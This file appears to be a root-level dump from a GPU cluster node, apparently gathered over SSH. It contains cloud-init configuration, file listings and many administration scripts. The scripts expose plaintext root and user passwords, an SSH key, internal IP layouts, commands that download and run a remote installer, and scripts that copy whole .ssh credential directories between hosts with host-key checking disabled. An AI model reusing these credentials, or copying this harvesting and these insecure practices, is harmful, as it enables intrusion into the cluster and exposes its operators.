@@ -1,0 +1,3247 @@
+Warning: Permanently added '123.184.7.135' (ED25519) to the list of known hosts.
+### META 2026-11-24T23:09:38Z
+uid=0(root) gid=0(root) groups=0(root)
+g0023
+5.15.0-122-generic
+89eac9f4aa734e8daefbb4963561a856
+### CLOUDINIT
+disable_root: 0
+ssh_pwauth: 1
+preserve_hostname: false
+datasource_list: [ ConfigDrive, Ec2 ]
+datasource:
+  Ec2:
+    strict_id: false
+network:
+  config: disabled
+cloud_init_modules:
+ - migrator
+ - seed_random
+ - bootcmd
+ - write-files
+ - customize-project
+ - growpart
+ - resizefs
+ - disk_setup
+ - mounts
+ - set_hostname
+ - update_etc_hosts
+ - ca-certs
+ - rsyslog
+ - users-groups
+ - update-authorized-keys
+ - ssh
+cloud_config_modules:
+ - emit_upstart
+ - snap_config
+ - ssh-import-id
+ - locale
+ - set-passwords
+ - reset-password
+ - grub-dpkg
+ - ntp
+ - timezone
+ - disable-ec2-metadata
+ - runcmd
+ - byobu
+cloud_final_modules:
+-- user-data
+-- scripts
+total 8
+drwxr-xr-x 2 root root 4096 Jan  3  2023 .
+drwxr-xr-x 6 root root 4096 Jan 10  2025 ..
+-- ci-out
+-- datasource
+total 16
+drwxr-xr-x  2 root root  140 May  7  2026 .
+drwxr-xr-x 41 root root 1860 Nov 25 07:09 ..
+-rw-r--r--  1 root root    2 May  7  2026 .ds-identify.result
+-rw-r--r--  1 root root  662 Nov 25 05:33 cloud-init-generator.log
+-rw-r--r--  1 root root   71 May  7  2026 cloud.cfg
+-rw-r--r--  1 root root 1164 May  7  2026 ds-identify.log
+-rw-r--r--  1 root root    0 Nov 25 05:33 enabled
+### IBMSTUFF
+-- find-ibm
+-- grep-ibm(contents)
+/root/ids-bare-metal-mon-installer.gnode.ubuntu/packages/dcgm_exporter/docker-4.1.1-ubuntu/temp/usr/bin/dcgm-exporter
+/root/ids-bare-metal-mon-installer.gnode.ubuntu/packages/dcgm_exporter/docker-4.1.1-ubuntu/4.2.3-slurm/usr/bin/dcgm-exporter
+/root/conf/root_rsa/ssh_config
+/root/conf/root_rsa/sshd_config
+/root/conf/ubuntu_rsa/ssh_config
+/root/conf/ubuntu_rsa/orig/ssh_config
+/root/conf/ubuntu_rsa/orig/sshd_config
+/root/conf/ubuntu_rsa/sshd_config
+/root/conf/ssh_config
+/root/conf/ssh_rsa/ssh_config
+/root/conf/ssh_rsa/sshd_config
+/root/conf/sshd_config
+/root/.local/share/uv/python/cpython-3.12.10-linux-x86_64-gnu/bin/python3.12
+/root/.local/share/uv/python/cpython-3.12.10-linux-x86_64-gnu/lib/libpython3.12.so.1.0
+/root/.local/share/uv/python/cpython-3.12.3-linux-x86_64-gnu/lib/libpython3.12.so.1.0
+/root/.acme.sh/deploy/kemplm.sh
+/root/.acme.sh/deploy/truenas_ws.sh
+/root/.acme.sh/deploy/truenas.sh
+/root/.acme.sh/notify/callmebotWhatsApp.sh
+/root/.acme.sh/dnsapi/dns_constellix.sh
+/root/.acme.sh/dnsapi/dns_namecheap.sh
+/root/.acme.sh/dnsapi/dns_netcup.sh
+/root/.acme.sh/dnsapi/dns_me.sh
+/root/.acme.sh/dnsapi/dns_gandi_livedns.sh
+/root/.acme.sh/dnsapi/dns_active24.sh
+/root/.acme.sh/dnsapi/dns_omglol.sh
+/root/.acme.sh/dnsapi/dns_simply.sh
+/root/.acme.sh/dnsapi/dns_gcore.sh
+/root/.acme.sh/dnsapi/dns_websupport.sh
+/root/.acme.sh/dnsapi/dns_sitehost.sh
+/root/.acme.sh/dnsapi/dns_edgecenter.sh
+/root/.acme.sh/dnsapi/dns_durabledns.sh
+/root/.acme.sh/dnsapi/dns_internetbs.sh
+/root/.acme.sh/dnsapi/dns_limacity.sh
+/root/.acme.sh/dnsapi/dns_rackspace.sh
+/root/.acme.sh/dnsapi/dns_west_cn.sh
+/root/.acme.sh/dnsapi/dns_kappernet.sh
+/root/.acme.sh/dnsapi/dns_hostingde.sh
+/root/.acme.sh/dnsapi/dns_dnsexit.sh
+/root/.acme.sh/dnsapi/dns_porkbun.sh
+### ENV
+### CONF-FILES
+===== /root/conf/pass.sh (191B)
+#!/bin/bash
+
+PASSWORD="Admin@123_para#!2024"
+
+for i in {1..16}
+do
+  HOST="g$(printf "%04d" $i)"
+  echo "Setting root password on $HOST"
+  ssh root@$HOST "echo root:$PASSWORD | chpasswd"
+done
+===== /root/conf/mianmi.txt (739B)
+#对于非root账号，且有sudo权限的适用。
+for i in g0047 g0048 g0049; do ssh $i 'echo $HOSTNAME; sudo su - ubuntu -c "echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCblZcdjQO0mnWs7oZZdzlNAQHD8ens10xt8ZpXTDCwIOJrf/fzy/mfLwojGY4jDm1P3euqPD2/niTKlvjSaL+L2HsVhoKzH4TQgjQmH3SgGqaHvhOs4wzHl8PYDNh9PJ1oy3y8c5JJHPF3maaJEVSXUVHCCr3Aw0z/NKhuf+x257QGppIqYV/Z45zK9VWt+oZOessH9rNHVHxQrdkMs0KgyVtzC331I+2DNaACwCD0SHiiTdUeqpB3rrjBKSPdBRkQOwDDqkltE55D/d74KjlCnU0TcsClFeQ8QOlkpm+z3f5aggES+Kdc04J+ImA6wGYJbVDTvnAzybDP5R5Th3SUd1hRt41BpMSU6tTYhGgKTYTQQJGNn46mAwiYUjUgrRuArPT4V3XPXidhGmAml57nGysPFyPdPlV2uGWs+wJmiNwfpgpzdfUM8EVL4Twzb+nr3gAZhOzrdS3qQ/Uo+t4PCVH6uXHo1wHrbJJp+GPDfVp9zSANt7+pj4b6oJqJkAc= langboat@m005\" >> ~/.ssh/authorized_keys" '; done===== /root/conf/ssh_config (1648B)
+
+# This is the ssh client system-wide configuration file.  See
+# ssh_config(5) for more information.  This file provides defaults for
+# users, and the values can be changed in per-user configuration files
+# or on the command line.
+
+# Configuration data is parsed as follows:
+#  1. command line options
+#  2. user-specific file
+#  3. system-wide file
+# Any configuration value is only changed the first time it is set.
+# Thus, host-specific definitions should be at the beginning of the
+# configuration file, and defaults at the end.
+
+# Site-wide defaults for some commonly used options.  For a comprehensive
+# list of available options, their meanings and defaults, please see the
+# ssh_config(5) man page.
+
+Include /etc/ssh/ssh_config.d/*.conf
+
+Host *
+#   ForwardAgent no
+#   ForwardX11 no
+#   ForwardX11Trusted yes
+#   PasswordAuthentication yes
+#   HostbasedAuthentication no
+#   GSSAPIAuthentication no
+#   GSSAPIDelegateCredentials no
+#   GSSAPIKeyExchange no
+#   GSSAPITrustDNS no
+#   BatchMode no
+#   CheckHostIP yes
+#   AddressFamily any
+#   ConnectTimeout 0
+   StrictHostKeyChecking no
+#   IdentityFile ~/.ssh/id_rsa
+#   IdentityFile ~/.ssh/id_dsa
+#   IdentityFile ~/.ssh/id_ecdsa
+#   IdentityFile ~/.ssh/id_ed25519
+#   Port 22
+#   Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc
+#   MACs hmac-md5,hmac-sha1,umac-64@openssh.com
+#   EscapeChar ~
+#   Tunnel no
+#   TunnelDevice any:any
+#   PermitLocalCommand no
+#   VisualHostKey no
+#   ProxyCommand ssh -q -W %h:%p gateway.example.com
+#   RekeyLimit 1G 1h
+#   UserKnownHostsFile ~/.ssh/known_hosts.d/%k
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes
+===== /root/conf/config (69B)
+Host *
+    StrictHostKeyChecking no
+    UserKnownHostsFile /dev/null
+===== /root/conf/env.sh (1062B)
+# fio v3.28
+export FIO_HOME=/opt/fio
+export PATH=${FIO_HOME}/bin:$PATH
+
+# iperf v2.1.5
+export IPERF_HOME=/opt/iperf
+export PATH=${IPERF_HOME}/bin:$PATH
+
+# qperf v0.4.11
+export QPERF_HOME=/opt/qperf
+export PATH=${QPERF_HOME}/bin:$PATH
+
+# stress-ng v0.13.12
+export STRESSNG_HOME=/opt/stress-ng/usr
+export PATH=${STRESSNG_HOME}/bin:$PATH
+
+# sysbench v1.0.20
+export SYSBENCH_HOME=/opt/sysbench
+export PATH=${SYSBENCH_HOME}/bin:$PATH
+
+# cuda v12.4
+export CUDA_HOME=/opt/cuda
+export PATH=${CUDA_HOME}/bin:$PATH
+export LD_LIBRARY_PATH=${CUDA_HOME}/lib64:${CUDA_HOME}/lib64/stubs:$LD_LIBRARY_PATH
+export LIBRARY_PATH=${CUDA_HOME}/lib64:${CUDA_HOME}/lib64/stubs:$LIBRARY_PATH
+export CPATH=${CUDA_HOME}/include:$CPATH
+
+# nccl v2.20.3-1
+export NCCL_HOME=/opt/nccl/build
+export LD_LIBRARY_PATH=${NCCL_HOME}/lib:$LD_LIBRARY_PATH
+export CPATH=${NCCL_HOME}/include:$CPATH
+#nccl-tests v2.13.10
+export NCCLTESTS_HOME=/opt/nccl-tests/build
+export PATH=${NCCLTESTS_HOME}:$PATH
+
+#nvbandwith v4
+export NVBANDWITH_HOME=/opt/source/nvbandwidth-0.4
+export PATH=${NVBANDWITH_HOME}:$PATH
+===== /root/conf/ids.sh (1268B)
+#!/bin/bash
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+PARENT_DIR="$(dirname "$SCRIPT_DIR")"
+
+SCRIPT_NAME="ids-bare-metal-mon-installer.gnode.ubuntu.v1.0.10.linux_amd64.sh"
+INSTALL_DIR="$PARENT_DIR/ids-bare-metal-mon-installer.gnode.ubuntu"
+
+# 检查脚本文件是否已存在
+if [ ! -f "$PARENT_DIR/$SCRIPT_NAME" ]; then
+    echo "下载安装脚本..."
+    wget -P $PARENT_DIR "https://file.mir.blsc.cn/deploy/monitor/$SCRIPT_NAME"
+    
+    if [ $? -ne 0 ]; then
+        echo "下载失败，请检查网络连接和URL是否正确"
+        exit 1
+    fi
+else
+    echo "安装脚本已存在，跳过下载"
+fi
+
+# 检查文件是否成功下载或已存在
+if [ -f "$PARENT_DIR/$SCRIPT_NAME" ]; then
+    chmod +x "$PARENT_DIR/$SCRIPT_NAME"
+    
+    # 执行安装脚本
+    cd $PARENT_DIR
+    ./$SCRIPT_NAME
+    
+    # 检查安装目录是否存在，然后执行后续命令
+    if [ -d "$INSTALL_DIR" ]; then
+        cd "$INSTALL_DIR"
+	sudo apt remove --purge datacenter-gpu-manager -y
+        sudo ./gnode-install
+        sudo ./gnode-setup-1s  
+        sudo ./gnode-check
+    else
+        echo "错误：安装目录 $INSTALL_DIR 不存在，安装可能失败"
+        exit 1
+    fi
+else
+    echo "错误：安装脚本 $SCRIPT_NAME 不存在"
+    exit 1
+fi
+===== /root/conf/hostname.sh (510B)
+#!/bin/bash
+
+# 读取hostlist文件中的IP地址
+mapfile -t hosts < hostlist
+
+# 设置初始主机名索引
+index=2
+
+# 遍历IP地址，并为每台主机设置新的主机名
+for host in "${hosts[@]}"; do
+	new_hostname="g$(printf '%04d' "$index")"  # 生成新的主机名，如g0002、g0003等
+	ssh "$host" "sudo hostnamectl set-hostname $new_hostname;sudo systemctl restart sshd"  # 通过SSH连接到远程主机，设置主机名并重启sshd服务
+	((index++))  # 移动到下一个主机名索引
+done
+===== /root/conf/change_hostname.sh (769B)
+#!/bin/bash
+apt-get install sshpass
+# 定义主机信息
+declare -A hosts=(
+  ["g0018"]="172.16.10.71"
+  ["g0019"]="172.16.10.72"
+  ["g0020"]="172.16.10.73"
+  ["g0021"]="172.16.10.74"
+  ["g0022"]="172.16.10.75"
+  ["g0023"]="172.16.10.76"
+  ["g0024"]="172.16.10.77"
+  ["g0025"]="172.16.10.78"
+)
+
+# SSH密码
+PASSWORD="Beijingcs.2024"
+
+# 遍历每个主机并修改主机名
+for hostname in "${!hosts[@]}"; do
+  ip="${hosts[$hostname]}"
+  echo "正在修改主机 $hostname ($ip)"
+  
+  # 使用 sshpass 进行自动化 SSH 登录
+  sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no root@$ip "hostnamectl set-hostname $hostname"
+  
+  if [ $? -eq 0 ]; then
+    echo "主机 $hostname ($ip) 修改成功"
+  else
+    echo "主机 $hostname ($ip) 修改失败"
+  fi
+done
+===== /root/conf/syncrclocal.sh (89B)
+#!/bin/bash
+
+hostname
+
+cp /data/apps/conf/rc.local /etc/rc.local
+
+chmod +x /etc/rc.local
+===== /root/conf/ssh.sh (649B)
+#!/bin/bash
+  
+# 获取当前脚本的绝对路径
+conf_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+
+# 获取原始调用用户
+original_user="${SUDO_USER:-$USER}"
+
+# 检查原始调用用户是否为 root
+if [ "$original_user" = "root" ]; then
+    # 原始调用用户是 root
+    echo "user name: root"
+    cp "${conf_dir}/root_rsa/sshd_config" /etc/ssh/
+    cp "${conf_dir}/root_rsa/ssh_config" /etc/ssh/
+else
+    # 原始调用用户不是 root
+    echo "user name: $original_user"
+    cp "${conf_dir}/ubuntu_rsa/sshd_config" /etc/ssh/
+    cp "${conf_dir}/ubuntu_rsa/ssh_config" /etc/ssh/
+fi
+
+# 重启 sshd 服务
+systemctl restart sshd
+===== /root/conf/ssh-ssh.sh (854B)
+#!/bin/bash
+
+# 定义节点范围
+START_NODE=1
+END_NODE=125
+
+# 格式化节点名称
+NODES=$(seq -f "node%03g" $START_NODE $END_NODE)
+
+# 输出测试结果的文件
+RESULT_FILE="ssh_test_results.log"
+> $RESULT_FILE  # 清空旧结果
+
+# 开始测试
+echo "开始测试节点之间的 SSH 连通性..."
+for NODE_A in $NODES; do
+    for NODE_B in $NODES; do
+        if [ "$NODE_A" != "$NODE_B" ]; then
+            # 测试 SSH 连通性
+            ssh -o BatchMode=yes -o ConnectTimeout=5 $NODE_A "ssh -o BatchMode=yes -o ConnectTimeout=5 $NODE_B 'echo SUCCESS'" &> /dev/null
+            if [ $? -eq 0 ]; then
+                echo "$NODE_A -> $NODE_B: SUCCESS" >> $RESULT_FILE
+            else
+                echo "$NODE_A -> $NODE_B: FAILED" >> $RESULT_FILE
+            fi
+        fi
+    done
+done
+
+echo "测试完成，结果已保存到 $RESULT_FILE"
+===== /root/conf/para_ssh.sh (989B)
+#连续的写法
+#seq 107 125 | xargs -I{} -P 10 ssh para@10.251.10.{} "echo \$HOSTNAME && sudo ~/NVIDIA-Linux-x86_64-550.90.07.run --dkms -s;sudo update-initramfs -k $(uname -r) -c;sudo cp ~/conf/nv_gpu_conf.sh /usr/local/bin/;sudo /usr/local/bin/nv_gpu_conf.sh >/tmp/nv_gpu_conf.log 2>&1;sudo modprobe nvidia_peermem"
+#离散的写法
+#printf "2\n4\n7\n8\n88" | xargs -I{} -P5 ssh ubuntu@172.16.21.{} "echo \$HOSTNAME && ~/conf/grub.sh;sudo ~/conf/disableupdate.sh; sudo ~/conf/disablenouveau.sh; sudo ~/conf/cpu_performance.sh; ~/conf/install_build_essential.sh; sudo ~/conf/installpackage.sh"
+seq 6 70 | awk '$1 != 13 && $1 != 67' | \
+xargs -I{} -P20 sh -c '
+  ip={}
+  host="10.242.32.$ip"
+  if timeout 15 ssh -o ConnectTimeout=10 -o StrictHostKeyChecking=no root@$host "echo \$HOSTNAME && /root/conf/ids.sh" 2>/dev/null; then
+    echo "✅ Success: $host"
+  else
+    echo "$ip" | flock /tmp/unreachable.lock tee -a /tmp/unreachable.txt >/dev/null
+    echo "❌ Failed: $host"
+  fi
+'
+
+===== /root/conf/para_scp.sh (210B)
+seq 107 125 | xargs -I{} -P 20 sh -c \
+  'scp -o ConnectTimeout=10 /etc/hosts para@10.251.10.{}:/tmp/hosts && \
+   ssh -o ConnectTimeout=10 para@10.251.10.{} "sudo mv /tmp/hosts /etc/hosts && echo {} success"'
+===== /root/conf/keygen.sh (306B)
+#!/bin/bash
+
+USERNAME=$1
+USER_HOME="/home/$USERNAME"
+ssh-keygen -t rsa -N '' -f $USER_HOME/.ssh/id_rsa
+cat $USER_HOME/.ssh/id_rsa.pub >> $USER_HOME/.ssh/authorized_keys
+
+# 添加环境变量到 .bashrc 文件
+echo 'source /usr/share/modules/init/profile.sh' >> $USER_HOME/.bashrc
+source $USER_HOME/.bashrc
+===== /root/conf/root_copy_id_rsa.sh (663B)
+#!/bin/bash
+#apt update -y
+#apt-get install expect -y
+#apt install python3 python3-pip -y
+#pip3 install spawn
+# 定义目标主机信息
+declare -a hosts=(
+  "10.80.80.12"
+  "10.80.80.13"
+  "10.80.80.14"
+)
+
+# SSH密码
+PASSWORD="Bingxing.2026"
+
+# 拷贝 .ssh 目录到每个目标主机
+for ip in "${hosts[@]}"; do
+  echo "正在拷贝 .ssh 目录到 $ip"
+  
+  expect << EOF
+set timeout 20
+spawn scp -r /root/.ssh root@$ip:/root
+expect {
+  "yes/no" { send "yes\r"; exp_continue }
+  "password:" { send "$PASSWORD\r" }
+}
+expect eof
+EOF
+
+  if [ $? -eq 0 ]; then
+    echo "成功拷贝 .ssh 目录到 $ip"
+  else
+    echo "拷贝 .ssh 目录到 $ip 失败"
+  fi
+done
+===== /root/conf/kgzs_copy_id_rsa.sh (670B)
+#!/bin/bash
+#apt-get install expect -y
+#apt install python3 python3-pip -y
+#pip3 install spawn
+# 定义目标主机信息
+declare -a hosts=(
+  "10.100.80.5"
+  "10.100.80.6"
+  "10.100.80.7"
+  "10.100.80.8"
+)
+
+# SSH密码
+PASSWORD="Kgzs@2024"
+
+# 拷贝 .ssh 目录到每个目标主机
+for ip in "${hosts[@]}"; do
+  echo "正在拷贝 .ssh 目录到 $ip"
+  
+  expect << EOF
+set timeout 20
+spawn scp -r /home/kgzs/.ssh kgzs@$ip:/home/kgzs
+expect {
+  "yes/no" { send "yes\r"; exp_continue }
+  "password:" { send "$PASSWORD\r" }
+}
+expect eof
+EOF
+
+  if [ $? -eq 0 ]; then
+    echo "成功拷贝 .ssh 目录到 $ip"
+  else
+    echo "拷贝 .ssh 目录到 $ip 失败"
+  fi
+done
+===== /root/conf/ubuntu_copy_id_rsa.sh (658B)
+#!/bin/bash
+apt-get install expect -y
+apt install python3 python3-pip -y
+pip3 install spawn
+# 定义目标主机信息
+declare -a hosts=(
+  "172.16.21.11"
+  "172.16.21.34"
+  "172.16.21.35"
+)
+
+# SSH密码
+PASSWORD="ubuntu@"
+
+# 拷贝 .ssh 目录到每个目标主机
+for ip in "${hosts[@]}"; do
+  echo "正在拷贝 .ssh 目录到 $ip"
+  
+  expect << EOF
+set timeout 20
+spawn scp -r /home/ubuntu/.ssh ubuntu@$ip:/home/ubuntu
+expect {
+  "yes/no" { send "yes\r"; exp_continue }
+  "password:" { send "$PASSWORD\r" }
+}
+expect eof
+EOF
+
+  if [ $? -eq 0 ]; then
+    echo "成功拷贝 .ssh 目录到 $ip"
+  else
+    echo "拷贝 .ssh 目录到 $ip 失败"
+  fi
+done
+===== /root/conf/check_nodes.sh (1403B)
+#!/bin/bash
+#!/bin/bash
+
+# 使用 mapfile 安全读取 hostlist4 的每一行到数组 ips
+# -t 表示去掉行尾换行符
+mapfile -t ips < hostlist5
+
+# 跳过空行和注释行（可选，但推荐）
+filtered_ips=()
+for line in "${ips[@]}"; do
+  # 去除首尾空白
+  trimmed=$(echo "$line" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
+  if [[ -n "$trimmed" && "$trimmed" != "#"* ]]; then
+    filtered_ips+=("$trimmed")
+  fi
+done
+ips=("${filtered_ips[@]}")
+
+# 存储异常节点
+declare -A failed_nodes
+
+echo "Testing connectivity to ${#ips[@]} nodes..."
+
+for ip in "${ips[@]}"; do
+  echo -n "Checking $ip ... "
+
+  # 尝试 SSH 并获取 hostname，超时 5 秒，不交互
+  if hostname=$(ssh -o ConnectTimeout=5 \
+                   -o BatchMode=yes \
+                   -o StrictHostKeyChecking=no \
+                   -o PasswordAuthentication=no \
+                   root@"$ip" 'hostname' 2>/dev/null); then
+    echo "OK (hostname: $hostname)"
+  else
+    echo "FAILED"
+    failed_nodes["$ip"]="N/A"   # SSH 失败时无法获取 hostname，直接标 N/A
+  fi
+done
+
+# 输出汇总
+echo
+echo "=== 异常节点列表 (共 ${#failed_nodes[@]} 个) ==="
+if [ ${#failed_nodes[@]} -eq 0 ]; then
+  echo "所有节点连通正常。"
+else
+  printf "%-15s %s\n" "IP" "HOSTNAME"
+  for ip in "${!failed_nodes[@]}"; do
+    hostname="${failed_nodes[$ip]}"
+    printf "%-15s %s\n" "$ip" "$hostname"
+  done
+fi
+===== /root/conf/check.sh (6525B)
+#!/bin/bash
+
+# 定义颜色
+GREEN='\033[0;32m'
+RED='\033[0;31m'
+NC='\033[0m' # 无颜色
+
+# 初始化计数器
+count_25000Mb=0
+count_400000Mb=0
+count_200000Mb=0
+count_50000Mb=0
+count_162=0
+count_106=0
+
+# 需要进行额外测试的网卡
+extra_test_netcards=()
+
+# 步骤状态存储
+declare -A step_status
+step_status[1]="未通过"
+step_status[2]="未通过"
+step_status[3]="未通过"
+step_status[4]="未通过"
+step_status[5]="未通过"
+step_status[6]="未通过"
+step_status[7]="未通过"
+# 删除本地磁盘挂载检查
+# step_status[8]="未通过"
+step_status[8]="未通过"  # 删除这行
+
+# 步骤描述
+step_description[1]="网卡检查"
+step_description[2]="RoCE配置一检查"
+step_description[3]="RoCE配置二检查"
+step_description[4]="ibstat状态检查"
+step_description[5]="文件系统挂载检查"
+step_description[6]="存储链路检查"
+step_description[7]="sshd服务检查"
+# 删除本地磁盘挂载检查
+# step_description[8]="本地磁盘挂载检查"
+step_description[8]="未描述"  # 删除这行
+
+# 检查是否以 root 权限运行
+if [ "$(id -u)" -ne 0 ]; then
+    echo -e "${RED}此脚本需要以 root 权限运行，请使用 sudo 或 root 用户执行！${NC}"
+    exit 1
+fi
+
+# 第一部分：网卡检查
+echo "第一步骤：网卡检查"
+
+for iface in $(ip -o link show | awk -F': ' '{print $2}' | grep -v 'lo'); do
+    if [ "$(cat /sys/class/net/$iface/operstate)" = "up" ]; then
+        rate=$(ethtool $iface 2>/dev/null | grep 'Speed' | awk '{print $2}')
+        if [ -n "$rate" ]; then
+            echo "$iface: $rate"
+            case "$rate" in
+                "25000Mb/s")
+                    count_25000Mb=$((count_25000Mb + 1))
+                    ;;
+                "400000Mb/s")
+                    count_400000Mb=$((count_400000Mb + 1))
+                    extra_test_netcards+=("$iface")
+                    ;;
+                "200000Mb/s")
+                    count_200000Mb=$((count_200000Mb + 1))
+                    extra_test_netcards+=("$iface")
+                    ;;
+                "50000Mb/s")
+                    count_50000Mb=$((count_50000Mb + 1))
+                    ;;
+
+            esac
+        else
+            echo "$iface: 无法获取速率"
+        fi
+    fi
+done
+
+echo "25000Mb/s: $count_25000Mb"
+echo "400000Mb/s: $count_400000Mb"
+echo "200000Mb/s: $count_200000Mb"
+echo "50000Mb/s: $count_50000Mb"
+
+if [ "$count_25000Mb" -eq 2 ] && [ "$count_400000Mb" -eq 8 ] && [ "$count_200000Mb" -eq 1 ] && [ "$count_50000Mb" -eq 1 ]; then
+    echo -e "${GREEN}第一步骤：网卡检查通过${NC}"
+    step_status[1]="通过"
+else
+    echo -e "${RED}第一步骤：网卡检查未通过${NC}"
+fi
+
+# 第二部分：RoCE配置一检查
+echo "第二步骤：RoCE配置一检查"
+
+# 标记是否所有网卡通过测试
+all_passed=true
+
+for iface in "${extra_test_netcards[@]}"; do
+    if mlnx_qos -i "$iface" 2>/dev/null | grep -q "Priority trust state: dscp"; then
+        echo -e "$iface: ${GREEN}通过第二步测试${NC}"
+    else
+        echo -e "$iface: ${RED}未通过第二步测试${NC}"
+        all_passed=false
+    fi
+done
+
+# 判断第二步骤是否通过
+if [ "$all_passed" = true ]; then
+    echo -e "${GREEN}第二步骤：RoCE配置一检查通过${NC}"
+    step_status[2]="通过"
+else
+    echo -e "${RED}第二步骤：RoCE配置一检查未通过${NC}"
+fi
+
+# 第三部分：RoCE配置二检查
+echo "第三步骤：RoCE配置二检查"
+
+# 遍历所有网卡并检查其 Global tclass 配置
+for iface in $(ls /sys/class/infiniband/); do
+    if [[ "$iface" == mlx5* ]]; then
+        traffic_class_file="/sys/class/infiniband/$iface/tc/1/traffic_class"
+        if [ -f "$traffic_class_file" ]; then
+            traffic_class=$(cat "$traffic_class_file")
+            # 统计 Global tclass=162 和 Global tclass=106 出现的次数
+            count_162=$((count_162 + $(echo "$traffic_class" | grep -o "162" | wc -l)))
+            count_106=$((count_106 + $(echo "$traffic_class" | grep -o "106" | wc -l)))
+        else
+            echo -e "$iface: ${RED}未找到 traffic_class 文件${NC}"
+        fi
+    fi
+done
+
+# 判断是否符合通过条件
+if [ "$count_162" -ge 8 ] && [ "$count_106" -ge 1 ]; then
+    echo -e "${GREEN}第三步骤：RoCE配置二检查通过${NC}"
+    step_status[3]="通过"
+else
+    echo -e "${RED}第三步骤：RoCE配置二检查未通过${NC}"
+    echo "实际配置: Global tclass=162 出现次数: $count_162, Global tclass=106 出现次数: $count_106"
+fi
+
+# 第四部分：ibstat 状态检查
+echo "第四步骤：ibstat 状态检查"
+
+ibstat_count=$(ibstat | grep -i active | wc -l)
+if [ "$ibstat_count" -ge 10 ]; then
+    echo -e "${GREEN}第四步骤：ibstat 状态检查通过${NC}"
+    step_status[4]="通过"
+else
+    echo -e "${RED}第四步骤：ibstat 状态检查未通过${NC}"
+fi
+
+# 第五部分：文件系统挂载检查
+echo "第五步骤：文件系统挂载检查"
+
+if df -hT | grep -q "gpfs01"; then
+    echo -e "${GREEN}第五步骤：文件系统挂载检查通过${NC}"
+    step_status[5]="通过"
+else
+    echo -e "${RED}第五步骤：文件系统挂载检查未通过${NC}"
+fi
+
+# 第六部分：存储链路检查
+echo "第六步骤：存储链路检查"
+
+if /usr/lpp/mmfs/bin/mmdiag --network | grep -A 3 "RDMA Connections between nodes" >/dev/null; then
+    echo -e "${GREEN}第六步骤：存储链路检查通过${NC}"
+    step_status[6]="通过"
+else
+    echo -e "${RED}第六步骤：存储链路检查未通过${NC}"
+fi
+
+# 第七部分：sshd服务检查
+echo "第七步骤：sshd服务检查"
+
+if systemctl status sshd | grep -q "running"; then
+    echo -e "${GREEN}第七步骤：sshd服务检查通过${NC}"
+    step_status[7]="通过"
+else
+    echo -e "${RED}第七步骤：sshd服务检查未通过${NC}"
+fi
+
+# 第九部分：整体检查结果
+echo "第九步骤：整体检查结果"
+passed_steps=0
+failed_steps=()
+
+for step in {1..7}; do  # 删除第8步骤
+    if [ "${step_status[$step]}" == "通过" ]; then
+        ((passed_steps++))
+    else
+        failed_steps+=("步骤$step: ${step_description[$step]}")
+    fi
+done
+
+if [ "$passed_steps" -eq 7 ]; then
+    echo -e "${GREEN}整体检查正常${NC}"
+else
+    echo -e "${RED}整机检查未通过${NC}"
+===== /root/conf/hostlist (42B)
+g0002
+g0003
+g0004
+g0005
+g0006
+g0007
+g0008
+===== /root/conf/hosts (1296B)
+127.0.0.1 localhost
+127.0.1.1 ubuntu
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+172.16.11.13	g0003
+172.16.11.14	g0004
+172.16.11.15	g0005
+172.16.11.16	g0006
+172.16.11.17	g0007
+172.16.11.18	g0008
+#gitHub Start
+140.82.121.3 github.com
+140.82.121.3 gist.github.com
+185.199.110.153 assets-cdn.github.com
+185.199.108.133 raw.githubusercontent.com
+185.199.111.133 gist.githubusercontent.com
+185.199.110.133 cloud.githubusercontent.com
+185.199.111.133 camo.githubusercontent.com
+185.199.111.133 avatars0.githubusercontent.com
+185.199.110.133 avatars1.githubusercontent.com
+185.199.111.133 avatars2.githubusercontent.com
+185.199.109.133 avatars3.githubusercontent.com
+185.199.108.133 avatars4.githubusercontent.com
+185.199.111.133 avatars5.githubusercontent.com
+185.199.109.133 avatars6.githubusercontent.com
+185.199.109.133 avatars7.githubusercontent.com
+185.199.110.133 avatars8.githubusercontent.com
+185.199.108.133 avatars.githubusercontent.com
+185.199.111.154 github.githubassets.com
+185.199.109.133 user-images.githubusercontent.com
+140.82.112.9 codeload.github.com
+185.199.110.133 favicons.githubusercontent.com
+192.30.255.116 api.github.com
+# GitHub End
+
+===== /root/conf/addiptoyaml.txt (108B)
+ip addr add 10.254.15.26/24 dev  ensxxxx   ip link set ensxxx up    ip route add default via 10.254.15.254  ===== /root/conf/ip_hostname_to_hosts.sh (315B)
+#install ifconfig
+for i in `cat hostlist`;do (ssh $i 'echo $HOSTNAME;sudo apt install net-tools -y');done
+#start get ip and hostname,and then write to hosts
+for i in $(cat hostlist); do ssh $i 'echo $HOSTNAME; echo $(ifconfig | grep 10.250.128 | awk -F " " '\''{print $2}'\'') $(hostname) >> /share/conf/hosts';done===== /root/conf/synchosts.sh (44B)
+#!/bin/bash
+
+cp /data/apps/conf/hosts /etc/
+===== /root/conf/root_rsa/ssh_config (1600B)
+
+# This is the ssh client system-wide configuration file.  See
+# ssh_config(5) for more information.  This file provides defaults for
+# users, and the values can be changed in per-user configuration files
+# or on the command line.
+
+# Configuration data is parsed as follows:
+#  1. command line options
+#  2. user-specific file
+#  3. system-wide file
+# Any configuration value is only changed the first time it is set.
+# Thus, host-specific definitions should be at the beginning of the
+# configuration file, and defaults at the end.
+
+# Site-wide defaults for some commonly used options.  For a comprehensive
+# list of available options, their meanings and defaults, please see the
+# ssh_config(5) man page.
+
+#Include /etc/ssh/ssh_config.d/*.conf
+
+Host *
+#   ForwardAgent no
+#   ForwardX11 no
+#   ForwardX11Trusted yes
+   PasswordAuthentication no
+#   HostbasedAuthentication no
+#   GSSAPIAuthentication no
+#   GSSAPIDelegateCredentials no
+#   GSSAPIKeyExchange no
+#   GSSAPITrustDNS no
+#   BatchMode no
+#   CheckHostIP yes
+#   AddressFamily any
+#   ConnectTimeout 0
+   StrictHostKeyChecking no
